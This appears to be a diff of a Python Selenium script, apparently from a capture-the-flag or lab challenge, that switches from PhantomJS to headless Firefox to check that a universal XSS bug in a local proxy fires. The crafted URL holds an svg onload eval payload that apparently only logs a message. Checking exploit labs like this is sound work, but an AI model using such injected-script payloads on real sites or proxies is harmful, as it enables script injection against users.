@@ -1,11 +1,12 @@
 #!/usr/bin/env python3
 
 from selenium import webdriver
-from selenium.common.exceptions import TimeoutException, WebDriverException
-from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
 from base64 import b64encode
+from selenium.webdriver.firefox.firefox_binary import FirefoxBinary
+import os
+import sys
 
-# Browse to URL to validate that UXSS proxy bug is working
+# Browse to exploit URL via proxy to validate that UXSS proxy bug is working
 
 # This payload will console.log("xss works")
 url ="""
@@ -30,24 +31,43 @@ ds/blocked.html?abcdeaaaaaaaaaaaaaaaaaaaa=
 " onload="eval(s)" ></svg>
 """.replace("\n","")
 
+os.environ['MOZ_HEADLESS'] = '1'
+binary = FirefoxBinary('/usr/bin/firefox', log_file=sys.stdout)
+myProxy = "127.0.0.1:7239"
+def ff_proxy(PROXY_HOST,PROXY_PORT, b):
+        fp = webdriver.FirefoxProfile()
+        fp.set_preference("network.proxy.type", 1)
+        fp.set_preference("network.proxy.http",PROXY_HOST)
+        fp.set_preference("network.proxy.http_port",PROXY_PORT)
+        fp.set_preference("network.proxy.ssl",PROXY_HOST)
+        fp.set_preference("network.proxy.ssl_port",PROXY_PORT)
+        fp.update_preferences()
+        return webdriver.Firefox(firefox_profile=fp, firefox_binary=b)
+driver = ff_proxy("127.0.0.1", 7239, binary)
 
-# Proxy config
-service_args = [
-    '--proxy=127.0.0.1:7239',
-    '--proxy-type=http',
-]
-proxy_creds = b"OnlyOne:Overflow"
-proxy_auth_token = "Basic " + b64encode(proxy_creds).decode("utf-8")
-caps = DesiredCapabilities.PHANTOMJS
-caps['phantomjs.page.customHeaders.Proxy-Authorization'] = proxy_auth_token
+from selenium.common.exceptions import TimeoutException, NoSuchElementException
+try:
+    driver.get(url)
+    driver.implicitly_wait(5)
+    driver.find_element_by_id("xss")
+    print("Success. UXSS ran")
 
-driver = webdriver.PhantomJS('/usr/bin/phantomjs', service_args=service_args,
-                                desired_capabilities=caps)
+    print("Load example...")
+    driver.get("http://example.com")
+    driver.implicitly_wait(5)
+    print(driver.page_source)
 
-driver.get(url)
-driver.implicitly_wait(10)
 
-print("\n<svg".join(driver.page_source.split("<svg")))
-l = driver.get_log("har")
 
-print("XSS" in l)
+    sys.exit(0)
+except NoSuchElementException:
+    print("Failure. xss element missing- UXSS didn't run?")
+    sys.exit(1)
+except Exception as e:
+    print("General failure")
+    raise e
+finally:
+    driver.quit()
+
+# Won't get here on successes
+sys.exit(1)
